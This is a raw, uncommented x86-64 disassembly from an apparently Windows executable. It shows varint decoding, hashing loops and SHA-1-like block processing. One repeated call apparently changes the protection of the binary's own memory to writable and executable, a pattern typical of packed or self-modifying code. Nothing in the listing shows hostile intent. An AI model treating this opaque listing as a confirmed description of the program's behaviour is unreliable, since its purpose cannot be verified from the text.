   140055b5a:	mov    rdx,rdi
   140055b5d:	push   0x1
   140055b5f:	pop    r8
   140055b61:	lea    r9,[rip+0x324a8]        # 0x140088010
   140055b68:	call   0x14003c1d3
   140055b6d:	movzx  esi,BYTE PTR [rax]
   140055b70:	mov    rcx,r13
   140055b73:	mov    rdx,rdi
   140055b76:	push   0x2
   140055b78:	pop    r8
   140055b7a:	lea    r9,[rip+0x324a7]        # 0x140088028
   140055b81:	call   0x14003c1d3
   140055b86:	movzx  r15d,BYTE PTR [rax]
   140055b8a:	mov    rcx,r13
   140055b8d:	mov    rdx,rdi
   140055b90:	push   0x3
   140055b92:	pop    r8
   140055b94:	lea    r9,[rip+0x324a5]        # 0x140088040
   140055b9b:	call   0x14003c1d3
   140055ba0:	movzx  eax,BYTE PTR [rax]
   140055ba3:	shl    eax,0x18
   140055ba6:	shl    r15d,0x10
   140055baa:	shl    esi,0x8
   140055bad:	or     rsi,r14
   140055bb0:	or     rsi,r15
   140055bb3:	or     rsi,rax
   140055bb6:	mov    rcx,QWORD PTR [rbp+0x7a0]
   140055bbd:	shr    rcx,0x3
   140055bc1:	inc    rcx
   140055bc4:	mov    rax,rsi
   140055bc7:	xor    edx,edx
   140055bc9:	div    rcx
   140055bcc:	lea    rax,[rdx*8+0x20]
   140055bd4:	mov    QWORD PTR [rbp+0x890],rax
   140055bdb:	mov    QWORD PTR [rbp+0x810],rdx
   140055be2:	mov    ecx,0xc8
   140055be7:	lea    r14,[rbp+0x1060]
   140055bee:	mov    rdi,r14
   140055bf1:	lea    rsi,[rbp+0x7d8]
   140055bf8:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   140055bfa:	mov    rcx,r12
   140055bfd:	mov    rdx,r13
   140055c00:	call   0x14006f7f7
   140055c05:	lea    rax,[rbx+0x10]
   140055c09:	mov    QWORD PTR [rbp+0xd10],rax
   140055c10:	mov    ecx,0xc8
   140055c15:	lea    rdi,[rbp+0xd18]
   140055c1c:	mov    rsi,r14
   140055c1f:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   140055c21:	mov    r10,QWORD PTR [rbp+0xd50]
   140055c28:	mov    rdx,QWORD PTR [rbp+0x5d0]
   140055c2f:	push   0x7
   140055c31:	pop    r8
   140055c33:	mov    rcx,QWORD PTR [rbp+0x380]
   140055c3a:	mov    rax,QWORD PTR [rbp+0x6b8]
   140055c41:	sub    r8d,0x1
   140055c45:	jb     0x140055c7f
   140055c47:	mov    r9,rdx
   140055c4a:	xor    r9,rcx
   140055c4d:	add    r9,rax
   140055c50:	rol    r9,0x28
   140055c54:	add    rcx,r9
   140055c57:	rol    rcx,0xf
   140055c5b:	mov    rax,rcx
   140055c5e:	shr    rax,0x1d
   140055c62:	xor    rcx,rax
   140055c65:	movabs rax,0x79ca1cd2f36bd757
   140055c6f:	imul   r9,rax
   140055c73:	add    rdx,QWORD PTR [rbp+0x5d0]
   140055c7a:	mov    rax,r9
   140055c7d:	jmp    0x140055c41
   140055c7f:	xor    rax,rcx
   140055c82:	shr    rax,0x20
   140055c86:	xor    edx,edx
   140055c88:	push   0x3d
   140055c8a:	pop    rcx
   140055c8b:	div    ecx
   140055c8d:	mov    r14d,edx
   140055c90:	mov    rax,QWORD PTR [rbp+0x388]
   140055c97:	add    rax,r14
   140055c9a:	sub    r10,rax
   140055c9d:	mov    eax,0x0
   140055ca2:	cmovb  r10,rax
   140055ca6:	cmp    r10,0x1
   140055caa:	mov    QWORD PTR [rbp+0x6a8],r10
   140055cb1:	mov    rax,r10
   140055cb4:	adc    rax,0x0
   140055cb8:	mov    QWORD PTR [rbp+0x3f8],rax
   140055cbf:	xor    edx,edx
   140055cc1:	div    QWORD PTR [rbp+0xf78]
   140055cc8:	mov    r12,rax
   140055ccb:	cmp    rax,0x1
   140055ccf:	adc    r12,0x0
   140055cd3:	lea    rcx,[rbp+0xcc0]
   140055cda:	mov    rdx,QWORD PTR [rbp+0x4e0]
   140055ce1:	call   0x14003c111
   140055ce6:	xor    r15d,r15d
   140055ce9:	cmp    r15,QWORD PTR [rbp+0x4e0]
   140055cf0:	je     0x1400562fc
   140055cf6:	mov    r8,QWORD PTR [rbp+0xdc8]
   140055cfd:	mov    r9,QWORD PTR [rbp+0xdd0]
   140055d04:	lea    rax,[r8+0x8]
   140055d08:	cmp    rax,r9
   140055d0b:	jbe    0x140055d14
   140055d0d:	xor    edx,edx
   140055d0f:	jmp    0x1400562e8
   140055d14:	mov    rax,QWORD PTR [rbp+0xdc0]
   140055d1b:	cmp    rax,0x8
   140055d1f:	jae    0x140056274
   140055d25:	mov    rcx,QWORD PTR [rbp+0xd60]
   140055d2c:	cmp    rcx,QWORD PTR [rbp+0xd68]
   140055d33:	jae    0x140055d77
   140055d35:	mov    rcx,QWORD PTR [rbp+0xd18]
   140055d3c:	mov    rdx,QWORD PTR [rbp+0xd58]
   140055d43:	cmp    rdx,rcx
   140055d46:	jae    0x140055d77
   140055d48:	lea    rax,[rbx+0x10]
   140055d4c:	movzx  esi,BYTE PTR [rax+rdx*1]
   140055d50:	and    esi,0x7f
   140055d53:	lea    rax,[rdx+0x1]
   140055d57:	cmp    rax,rcx
   140055d5a:	jae    0x140055d85
   140055d5c:	movzx  r8d,BYTE PTR [rbx+rdx*1+0x11]
   140055d62:	test   r8b,r8b
   140055d65:	jns    0x140055d7f
   140055d67:	shl    rsi,0x7
   140055d6b:	and    r8d,0x7f
   140055d6f:	or     rsi,r8
   140055d72:	mov    rdx,rax
   140055d75:	jmp    0x140055d53
   140055d77:	xor    r11d,r11d
   140055d7a:	jmp    0x1400561f0
   140055d7f:	inc    rdx
   140055d82:	mov    rcx,rdx
   140055d85:	mov    QWORD PTR [rbp+0xd58],rcx
   140055d8c:	mov    rax,rsi
   140055d8f:	shr    rax,0x8
   140055d93:	mov    rdi,rsi
   140055d96:	shr    rdi,0x28
   140055d9a:	movaps XMMWORD PTR [rbp+0x740],xmm7
   140055da1:	movaps XMMWORD PTR [rbp+0x730],xmm7
   140055da8:	movaps XMMWORD PTR [rbp+0x720],xmm7
   140055daf:	movaps XMMWORD PTR [rbp+0x710],xmm7
   140055db6:	mov    DWORD PTR [rbp+0x7d0],eax
   140055dbc:	lea    rax,[rip+0x32295]        # 0x140088058
   140055dc3:	mov    QWORD PTR [rsp+0x20],rax
   140055dc8:	lea    rcx,[rbp+0x710]
   140055dcf:	push   0x4
   140055dd1:	pop    rdx
   140055dd2:	lea    r8,[rbp+0x7d0]
   140055dd9:	mov    r9,rdx
   140055ddc:	call   0x1400638fe
   140055de1:	mov    BYTE PTR [rbp+0x714],dil
   140055de8:	mov    rdi,QWORD PTR [rbp+0xd30]
   140055def:	cmp    QWORD PTR [rbp+0xd78],rdi
   140055df6:	jbe    0x140055f26
   140055dfc:	mov    r9,QWORD PTR [rbp+0xd38]
   140055e03:	cmp    r9,0x4
   140055e07:	ja     0x140059d9c
   140055e0d:	mov    rcx,QWORD PTR [rbp+0xd40]
   140055e14:	cmp    rcx,0x5
   140055e18:	jae    0x140059dae
   140055e1e:	mov    r8,QWORD PTR [rbp+0xd78]
   140055e25:	cmp    r8,rdi
   140055e28:	je     0x140059dbc
   140055e2e:	mov    eax,DWORD PTR [rbp+rcx*4+0xd88]
   140055e35:	mov    cl,BYTE PTR [rbp+0xd48]
   140055e3b:	rol    eax,cl
   140055e3d:	sub    r8,rdi
   140055e40:	xor    eax,DWORD PTR [rbp+r9*4+0xd88]
   140055e48:	xor    edx,edx
   140055e4a:	div    r8
   140055e4d:	mov    r13,rdx
   140055e50:	mov    rax,QWORD PTR [rbp+0xd80]
   140055e57:	mov    QWORD PTR [rbp+0x1060],rax
   140055e5e:	cmp    rdi,0x40
   140055e62:	push   0x40
   140055e64:	pop    rax
   140055e65:	cmovae rdi,rax
   140055e69:	movaps XMMWORD PTR [rbp+0x800],xmm7
   140055e70:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   140055e77:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   140055e7e:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   140055e85:	lea    rcx,[rbp+0x7d0]
   140055e8c:	mov    rdx,rdi
   140055e8f:	call   0x14003c0b8
   140055e94:	mov    r10,QWORD PTR [rbp+0xd78]
   140055e9b:	test   r10,r10
   140055e9e:	je     0x140055eec
   140055ea0:	mov    rcx,rax
   140055ea3:	mov    r8,rdx
   140055ea6:	mov    rax,rdx
   140055ea9:	add    rax,r13
   140055eac:	mov    r9,QWORD PTR [rbp+0xd70]
   140055eb3:	cmp    rax,r10
   140055eb6:	jbe    0x140055ed6
   140055eb8:	xor    r11d,r11d
   140055ebb:	cmp    r8,r11
   140055ebe:	je     0x140055eec
   140055ec0:	lea    rax,[r11+r13*1]
   140055ec4:	xor    edx,edx
   140055ec6:	div    r10
   140055ec9:	mov    al,BYTE PTR [r9+rdx*1]
   140055ecd:	mov    BYTE PTR [rcx+r11*1],al
   140055ed1:	inc    r11
   140055ed4:	jmp    0x140055ebb
   140055ed6:	add    r9,r13
   140055ed9:	xor    eax,eax
   140055edb:	cmp    r8,rax
   140055ede:	je     0x140055eec
   140055ee0:	mov    dl,BYTE PTR [r9+rax*1]
   140055ee4:	mov    BYTE PTR [rcx+rax*1],dl
   140055ee7:	inc    rax
   140055eea:	jmp    0x140055edb
   140055eec:	mov    rcx,QWORD PTR [rbp+0xd28]
   140055ef3:	xor    eax,eax
   140055ef5:	cmp    rdi,rax
   140055ef8:	je     0x140055f26
   140055efa:	cmp    rcx,0x3f
   140055efe:	ja     0x140059d8e
   140055f04:	mov    edx,eax
   140055f06:	and    edx,0x7
   140055f09:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   140055f10:	xor    dl,BYTE PTR [rbp+rax*1+0x7d0]
   140055f17:	inc    rax
   140055f1a:	mov    BYTE PTR [rbp+rcx*1+0x710],dl
   140055f21:	inc    rcx
   140055f24:	jmp    0x140055ef5
   140055f26:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   140055f2d:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   140055f34:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   140055f3b:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   140055f42:	xor    eax,eax
   140055f44:	cmp    rax,0x40
   140055f48:	je     0x140055f60
   140055f4a:	mov    ecx,DWORD PTR [rbp+rax*1+0x710]
   140055f51:	bswap  ecx
   140055f53:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   140055f5a:	add    rax,0x4
   140055f5e:	jmp    0x140055f44
   140055f60:	movups xmm0,XMMWORD PTR [rbp+0xd88]
   140055f67:	mov    eax,DWORD PTR [rbp+0xd98]
   140055f6d:	movups XMMWORD PTR [rbp+0x7d0],xmm0
   140055f74:	mov    DWORD PTR [rbp+0x7e0],eax
   140055f7a:	and    DWORD PTR [rbp+0x7e4],0x0
   140055f81:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   140055f88:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   140055f8f:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   140055f96:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   140055f9d:	lea    rax,[rbp+0x7e8]
   140055fa4:	movups XMMWORD PTR [rax+0x30],xmm3
   140055fa8:	movups XMMWORD PTR [rax+0x20],xmm2
   140055fac:	movups XMMWORD PTR [rax+0x10],xmm1
   140055fb0:	movups XMMWORD PTR [rax],xmm0
   140055fb3:	call   0x140064214
   140055fb8:	mov    al,BYTE PTR [rip+0x42acf]        # 0x140098a8d
   140055fbe:	cmp    al,0x1
   140055fc0:	je     0x140056009
   140055fc2:	movzx  eax,al
   140055fc5:	cmp    eax,0x2
   140055fc8:	je     0x1400560af
   140055fce:	and    DWORD PTR [rbp+0x640],0x0
   140055fd5:	lea    rcx,[rip+0xfffffffffffab0a4]        # 0x140001080
   140055fdc:	mov    rdx,QWORD PTR [rbp+0x1150]
   140055fe3:	push   0x40
   140055fe5:	pop    r8
   140055fe7:	lea    r9,[rbp+0x640]
   140055fee:	call   QWORD PTR [rip+0x3e814]        # 0x140094808
   140055ff4:	test   eax,eax
   140055ff6:	sete   cl
   140055ff9:	inc    cl
   140055ffb:	mov    BYTE PTR [rip+0x42a8c],cl        # 0x140098a8d
   140056001:	test   eax,eax
   140056003:	je     0x1400560af
   140056009:	mov    al,BYTE PTR [rip+0x42ba9]        # 0x140098bb8
   14005600f:	cmp    al,0x1
   140056011:	je     0x140056036
   140056013:	movzx  eax,al
   140056016:	test   eax,eax
   140056018:	jne    0x1400560af
   14005601e:	call   0x140065d51
   140056023:	test   rax,rax
   140056026:	sete   cl
   140056029:	inc    cl
   14005602b:	mov    BYTE PTR [rip+0x42b87],cl        # 0x140098bb8
   140056031:	test   rax,rax
   140056034:	je     0x1400560af
   140056036:	call   0x140064227
   14005603b:	mov    eax,0xc8c291de
   140056040:	xchg   DWORD PTR [rip+0x42a9a],eax        # 0x140098ae0
   140056046:	call   QWORD PTR [rip+0x3e604]        # 0x140094650
   14005604c:	mov    eax,eax
   14005604e:	mov    QWORD PTR [rip+0x41fab],rax        # 0x140098000
   140056055:	lea    rcx,[rbp+0x7d0]
   14005605c:	push   0xffffffffffffffff
   14005605e:	pop    rdx
   14005605f:	call   0x14002b840
   140056064:	xor    eax,eax
   140056066:	xchg   DWORD PTR [rip+0x42a74],eax        # 0x140098ae0
   14005606c:	mov    BYTE PTR [rip+0x42a1b],0x0        # 0x140098a8e
   140056073:	mov    eax,DWORD PTR [rbp+0x7d0]
   140056079:	add    DWORD PTR [rbp+0xd88],eax
   14005607f:	mov    eax,DWORD PTR [rbp+0x7d4]
   140056085:	add    DWORD PTR [rbp+0xd8c],eax
   14005608b:	mov    eax,DWORD PTR [rbp+0x7d8]
   140056091:	add    DWORD PTR [rbp+0xd90],eax
   140056097:	mov    eax,DWORD PTR [rbp+0x7dc]
   14005609d:	add    DWORD PTR [rbp+0xd94],eax
   1400560a3:	mov    eax,DWORD PTR [rbp+0x7e0]
   1400560a9:	add    DWORD PTR [rbp+0xd98],eax
   1400560af:	mov    BYTE PTR [rip+0x429d6],0x0        # 0x140098a8c
   1400560b6:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   1400560bd:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   1400560c4:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   1400560cb:	xor    eax,eax
   1400560cd:	cmp    rax,0x14
   1400560d1:	je     0x1400560e9
   1400560d3:	mov    ecx,DWORD PTR [rbp+rax*1+0xd88]
   1400560da:	bswap  ecx
   1400560dc:	mov    DWORD PTR [rbp+rax*1+0x7d0],ecx
   1400560e3:	add    rax,0x4
   1400560e7:	jmp    0x1400560cd
   1400560e9:	mov    r8,QWORD PTR [rbp+0xd20]
   1400560f0:	mov    eax,esi
   1400560f2:	shr    eax,0x3
   1400560f5:	and    eax,0x1f
   1400560f8:	lea    rcx,[rax+rbp*1]
   1400560fc:	add    rcx,0x7d0
   140056103:	xor    r9d,r9d
   140056106:	xor    edx,edx
   140056108:	xor    eax,eax
   14005610a:	cmp    r9,0x10
   14005610e:	je     0x140056129
   140056110:	shld   rax,rdx,0x8
   140056115:	mov    r10,rdx
   140056118:	shl    r10,0x8
   14005611c:	movzx  edx,BYTE PTR [rcx+r9*1]
   140056121:	inc    r9
   140056124:	or     rdx,r10
   140056127:	jmp    0x14005610a
   140056129:	push   0xffffffffffffffff
   14005612b:	pop    r9
   14005612d:	mov    r10,r9
   140056130:	mov    ecx,r8d
   140056133:	shl    r10,cl
   140056136:	cmp    r8,0x40
   14005613a:	not    r10
   14005613d:	cmovae r10,r9
   140056141:	and    esi,0x7
   140056144:	lea    ecx,[r8+rsi*1]
   140056148:	neg    cl
   14005614a:	shrd   rdx,rax,cl
   14005614e:	shr    rax,cl
   140056151:	test   cl,0x40
   140056154:	cmove  rax,rdx
   140056158:	and    rax,r10
   14005615b:	mov    rsi,QWORD PTR [rbp+0xd60]
   140056162:	add    r8,0x7
   140056166:	bswap  rax
   140056169:	shr    r8,0x3
   14005616d:	mov    QWORD PTR [rbp+0x1060],rax
   140056174:	mov    r9,rsi
   140056177:	imul   r9,r8
   14005617b:	push   0x8
   14005617d:	pop    rcx
   14005617e:	sub    rcx,r8
   140056181:	dec    r8
   140056184:	mov    rax,QWORD PTR [rbp+0x1168]
   14005618b:	lea    r11,[rax+r9*1]
   14005618f:	mov    rax,r9
   140056192:	xor    edx,edx
   140056194:	push   0x14
   140056196:	pop    rdi
   140056197:	div    rdi
   14005619a:	cmp    rcx,0x8
   14005619e:	je     0x1400561c4
   1400561a0:	cmp    r8,0x7
   1400561a4:	ja     0x140059d80
   1400561aa:	imul   rax,rax,0xffffffffffffffec
   1400561ae:	mov    al,BYTE PTR [r11+rax*1]
   1400561b2:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   1400561b9:	inc    rcx
   1400561bc:	inc    r11
   1400561bf:	inc    r9
   1400561c2:	jmp    0x14005618f
   1400561c4:	mov    r11,QWORD PTR [rbp+0x1060]
   1400561cb:	bswap  r11
   1400561ce:	and    r11,r10
   1400561d1:	inc    rsi
   1400561d4:	mov    QWORD PTR [rbp+0xd60],rsi
   1400561db:	mov    r9,QWORD PTR [rbp+0xdd0]
   1400561e2:	mov    rax,QWORD PTR [rbp+0xdc0]
   1400561e9:	mov    r8,QWORD PTR [rbp+0xdc8]
   1400561f0:	mov    rdx,r9
   1400561f3:	sub    rdx,r8
   1400561f6:	sub    rdx,rax
   1400561f9:	mov    rcx,QWORD PTR [rbp+0xd20]
   140056200:	cmp    rdx,rcx
   140056203:	cmovae rdx,rcx
   140056207:	cmp    rdx,0x1
   14005620b:	adc    rdx,0x0
   14005620f:	mov    r10d,ecx
   140056212:	sub    r10d,edx
   140056215:	and    r10b,0x3f
   140056219:	cmp    rcx,rdx
   14005621c:	movzx  ecx,r10b
   140056220:	mov    r10d,0x0
   140056226:	cmovbe ecx,r10d
   14005622a:	shr    r11,cl
   14005622d:	mov    r10,QWORD PTR [rbp+0xdb0]
   140056234:	mov    rsi,QWORD PTR [rbp+0xdb8]
   14005623b:	mov    ecx,edx
   14005623d:	shld   rsi,r10,cl
   140056241:	shl    r10,cl
   140056244:	test   dl,0x40
   140056247:	cmovne rsi,r10
   14005624b:	mov    ecx,0x0
   140056250:	cmove  rcx,r10
   140056254:	or     rcx,r11
   140056257:	mov    QWORD PTR [rbp+0xdb8],rsi
   14005625e:	mov    QWORD PTR [rbp+0xdb0],rcx
   140056265:	add    rax,rdx
   140056268:	mov    QWORD PTR [rbp+0xdc0],rax
   14005626f:	jmp    0x140055d1b
   140056274:	add    rax,0xfffffffffffffff8
   140056278:	mov    QWORD PTR [rbp+0xdc0],rax
   14005627f:	mov    r9,QWORD PTR [rbp+0xdb8]
   140056286:	mov    r10,r9
   140056289:	mov    ecx,eax
   14005628b:	shr    r10,cl
   14005628e:	mov    r11,QWORD PTR [rbp+0xdb0]
   140056295:	mov    rdx,r11
   140056298:	shrd   rdx,r9,cl
   14005629c:	push   0xffffffffffffffff
   14005629e:	pop    rdi
   14005629f:	mov    rsi,rdi
   1400562a2:	shl    rsi,cl
   1400562a5:	test   al,0x40
   1400562a7:	cmovne rdx,r10
   1400562ab:	mov    ecx,0x0
   1400562b0:	cmove  rcx,rsi
   1400562b4:	cmove  rsi,rdi
   1400562b8:	not    rsi
   1400562bb:	not    rcx
   1400562be:	and    rcx,r11
   1400562c1:	and    rsi,r9
   1400562c4:	test   rax,rax
   1400562c7:	cmove  rsi,rax
   1400562cb:	cmove  rcx,rax
   1400562cf:	mov    QWORD PTR [rbp+0xdb0],rcx
   1400562d6:	mov    QWORD PTR [rbp+0xdb8],rsi
   1400562dd:	add    r8,0x8
   1400562e1:	mov    QWORD PTR [rbp+0xdc8],r8
   1400562e8:	inc    r15
   1400562eb:	lea    rcx,[rbp+0xcc0]
   1400562f2:	call   0x14003c141
   1400562f7:	jmp    0x140055ce9
   1400562fc:	mov    rax,QWORD PTR [rbp+0xcc0]
   140056303:	mov    QWORD PTR [rbp+0x7a0],rax
   14005630a:	mov    rax,QWORD PTR [rbp+0xcc8]
   140056311:	mov    QWORD PTR [rbp+0x1138],rax
   140056318:	mov    rax,QWORD PTR [rbp+0xcd0]
   14005631f:	mov    QWORD PTR [rbp+0x1148],rax
   140056326:	test   r14d,r14d
   140056329:	je     0x140056963
   14005632f:	lea    rcx,[rbp+0xcc0]
   140056336:	mov    rdx,r14
   140056339:	call   0x14003c111
   14005633e:	xor    r15d,r15d
   140056341:	cmp    r15,r14
   140056344:	je     0x140056950
   14005634a:	mov    r8,QWORD PTR [rbp+0xdc8]
   140056351:	mov    r9,QWORD PTR [rbp+0xdd0]
   140056358:	lea    rax,[r8+0x8]
   14005635c:	cmp    rax,r9
   14005635f:	jbe    0x140056368
   140056361:	xor    edx,edx
   140056363:	jmp    0x14005693c
   140056368:	mov    rax,QWORD PTR [rbp+0xdc0]
   14005636f:	cmp    rax,0x8
   140056373:	jae    0x1400568c8
   140056379:	mov    rcx,QWORD PTR [rbp+0xd60]
   140056380:	cmp    rcx,QWORD PTR [rbp+0xd68]
   140056387:	jae    0x1400563cb
   140056389:	mov    rcx,QWORD PTR [rbp+0xd18]
   140056390:	mov    rdx,QWORD PTR [rbp+0xd58]
   140056397:	cmp    rdx,rcx
   14005639a:	jae    0x1400563cb
   14005639c:	lea    rax,[rbx+0x10]
   1400563a0:	movzx  esi,BYTE PTR [rax+rdx*1]
   1400563a4:	and    esi,0x7f
   1400563a7:	lea    rax,[rdx+0x1]
   1400563ab:	cmp    rax,rcx
   1400563ae:	jae    0x1400563d9
   1400563b0:	movzx  r8d,BYTE PTR [rbx+rdx*1+0x11]
   1400563b6:	test   r8b,r8b
   1400563b9:	jns    0x1400563d3
   1400563bb:	shl    rsi,0x7
   1400563bf:	and    r8d,0x7f
   1400563c3:	or     rsi,r8
   1400563c6:	mov    rdx,rax
   1400563c9:	jmp    0x1400563a7
   1400563cb:	xor    r11d,r11d
   1400563ce:	jmp    0x140056844
   1400563d3:	inc    rdx
   1400563d6:	mov    rcx,rdx
   1400563d9:	mov    QWORD PTR [rbp+0xd58],rcx
   1400563e0:	mov    rax,rsi
   1400563e3:	shr    rax,0x8
   1400563e7:	mov    rdi,rsi
   1400563ea:	shr    rdi,0x28
   1400563ee:	movaps XMMWORD PTR [rbp+0x740],xmm7
   1400563f5:	movaps XMMWORD PTR [rbp+0x730],xmm7
   1400563fc:	movaps XMMWORD PTR [rbp+0x720],xmm7
   140056403:	movaps XMMWORD PTR [rbp+0x710],xmm7
   14005640a:	mov    DWORD PTR [rbp+0x7d0],eax
   140056410:	lea    rax,[rip+0x31c41]        # 0x140088058
   140056417:	mov    QWORD PTR [rsp+0x20],rax
   14005641c:	lea    rcx,[rbp+0x710]
   140056423:	push   0x4
   140056425:	pop    rdx
   140056426:	lea    r8,[rbp+0x7d0]
   14005642d:	mov    r9,rdx
   140056430:	call   0x1400638fe
   140056435:	mov    BYTE PTR [rbp+0x714],dil
   14005643c:	mov    rdi,QWORD PTR [rbp+0xd30]
   140056443:	cmp    QWORD PTR [rbp+0xd78],rdi
   14005644a:	jbe    0x14005657a
   140056450:	mov    r9,QWORD PTR [rbp+0xd38]
   140056457:	cmp    r9,0x4
   14005645b:	ja     0x140059d9c
   140056461:	mov    rcx,QWORD PTR [rbp+0xd40]
   140056468:	cmp    rcx,0x5
   14005646c:	jae    0x140059dae
   140056472:	mov    r8,QWORD PTR [rbp+0xd78]
   140056479:	cmp    r8,rdi
   14005647c:	je     0x140059dbc
   140056482:	mov    eax,DWORD PTR [rbp+rcx*4+0xd88]
   140056489:	mov    cl,BYTE PTR [rbp+0xd48]
   14005648f:	rol    eax,cl
   140056491:	sub    r8,rdi
   140056494:	xor    eax,DWORD PTR [rbp+r9*4+0xd88]
   14005649c:	xor    edx,edx
   14005649e:	div    r8
   1400564a1:	mov    r13,rdx
   1400564a4:	mov    rax,QWORD PTR [rbp+0xd80]
   1400564ab:	mov    QWORD PTR [rbp+0x1060],rax
   1400564b2:	cmp    rdi,0x40
   1400564b6:	push   0x40
   1400564b8:	pop    rax
   1400564b9:	cmovae rdi,rax
   1400564bd:	movaps XMMWORD PTR [rbp+0x800],xmm7
   1400564c4:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   1400564cb:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   1400564d2:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   1400564d9:	lea    rcx,[rbp+0x7d0]
   1400564e0:	mov    rdx,rdi
   1400564e3:	call   0x14003c0b8
   1400564e8:	mov    r10,QWORD PTR [rbp+0xd78]
   1400564ef:	test   r10,r10
   1400564f2:	je     0x140056540
   1400564f4:	mov    rcx,rax
   1400564f7:	mov    r8,rdx
   1400564fa:	mov    rax,rdx
   1400564fd:	add    rax,r13
   140056500:	mov    r9,QWORD PTR [rbp+0xd70]
   140056507:	cmp    rax,r10
   14005650a:	jbe    0x14005652a
   14005650c:	xor    r11d,r11d
   14005650f:	cmp    r8,r11
   140056512:	je     0x140056540
   140056514:	lea    rax,[r11+r13*1]
   140056518:	xor    edx,edx
   14005651a:	div    r10
   14005651d:	mov    al,BYTE PTR [r9+rdx*1]
   140056521:	mov    BYTE PTR [rcx+r11*1],al
   140056525:	inc    r11
   140056528:	jmp    0x14005650f
   14005652a:	add    r9,r13
   14005652d:	xor    eax,eax
   14005652f:	cmp    r8,rax
   140056532:	je     0x140056540
   140056534:	mov    dl,BYTE PTR [r9+rax*1]
   140056538:	mov    BYTE PTR [rcx+rax*1],dl
   14005653b:	inc    rax
   14005653e:	jmp    0x14005652f
   140056540:	mov    rcx,QWORD PTR [rbp+0xd28]
   140056547:	xor    eax,eax
   140056549:	cmp    rdi,rax
   14005654c:	je     0x14005657a
   14005654e:	cmp    rcx,0x3f
   140056552:	ja     0x140059d8e
   140056558:	mov    edx,eax
   14005655a:	and    edx,0x7
   14005655d:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   140056564:	xor    dl,BYTE PTR [rbp+rax*1+0x7d0]
   14005656b:	inc    rax
   14005656e:	mov    BYTE PTR [rbp+rcx*1+0x710],dl
   140056575:	inc    rcx
   140056578:	jmp    0x140056549
   14005657a:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   140056581:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   140056588:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   14005658f:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   140056596:	xor    eax,eax
   140056598:	cmp    rax,0x40
   14005659c:	je     0x1400565b4
   14005659e:	mov    ecx,DWORD PTR [rbp+rax*1+0x710]
   1400565a5:	bswap  ecx
   1400565a7:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   1400565ae:	add    rax,0x4
   1400565b2:	jmp    0x140056598
   1400565b4:	movups xmm0,XMMWORD PTR [rbp+0xd88]
   1400565bb:	mov    eax,DWORD PTR [rbp+0xd98]
   1400565c1:	movups XMMWORD PTR [rbp+0x7d0],xmm0
   1400565c8:	mov    DWORD PTR [rbp+0x7e0],eax
   1400565ce:	and    DWORD PTR [rbp+0x7e4],0x0
   1400565d5:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   1400565dc:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   1400565e3:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   1400565ea:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   1400565f1:	lea    rax,[rbp+0x7e8]
   1400565f8:	movups XMMWORD PTR [rax+0x30],xmm3
   1400565fc:	movups XMMWORD PTR [rax+0x20],xmm2
   140056600:	movups XMMWORD PTR [rax+0x10],xmm1
   140056604:	movups XMMWORD PTR [rax],xmm0
   140056607:	call   0x140064214
   14005660c:	mov    al,BYTE PTR [rip+0x4247b]        # 0x140098a8d
   140056612:	cmp    al,0x1
   140056614:	je     0x14005665d
   140056616:	movzx  eax,al
   140056619:	cmp    eax,0x2
   14005661c:	je     0x140056703
   140056622:	and    DWORD PTR [rbp+0x640],0x0
   140056629:	lea    rcx,[rip+0xfffffffffffaaa50]        # 0x140001080
   140056630:	mov    rdx,QWORD PTR [rbp+0x1150]
   140056637:	push   0x40
   140056639:	pop    r8
   14005663b:	lea    r9,[rbp+0x640]
   140056642:	call   QWORD PTR [rip+0x3e1c0]        # 0x140094808
   140056648:	test   eax,eax
   14005664a:	sete   cl
   14005664d:	inc    cl
   14005664f:	mov    BYTE PTR [rip+0x42438],cl        # 0x140098a8d
   140056655:	test   eax,eax
   140056657:	je     0x140056703
   14005665d:	mov    al,BYTE PTR [rip+0x42555]        # 0x140098bb8
   140056663:	cmp    al,0x1
   140056665:	je     0x14005668a
   140056667:	movzx  eax,al
   14005666a:	test   eax,eax
   14005666c:	jne    0x140056703
   140056672:	call   0x140065d51
   140056677:	test   rax,rax
   14005667a:	sete   cl
   14005667d:	inc    cl
   14005667f:	mov    BYTE PTR [rip+0x42533],cl        # 0x140098bb8
   140056685:	test   rax,rax
   140056688:	je     0x140056703
   14005668a:	call   0x140064227
   14005668f:	mov    eax,0xc8c291de
   140056694:	xchg   DWORD PTR [rip+0x42446],eax        # 0x140098ae0
   14005669a:	call   QWORD PTR [rip+0x3dfb0]        # 0x140094650
   1400566a0:	mov    eax,eax
   1400566a2:	mov    QWORD PTR [rip+0x41957],rax        # 0x140098000
   1400566a9:	lea    rcx,[rbp+0x7d0]
   1400566b0:	push   0xffffffffffffffff
   1400566b2:	pop    rdx
   1400566b3:	call   0x14002b840
   1400566b8:	xor    eax,eax
   1400566ba:	xchg   DWORD PTR [rip+0x42420],eax        # 0x140098ae0
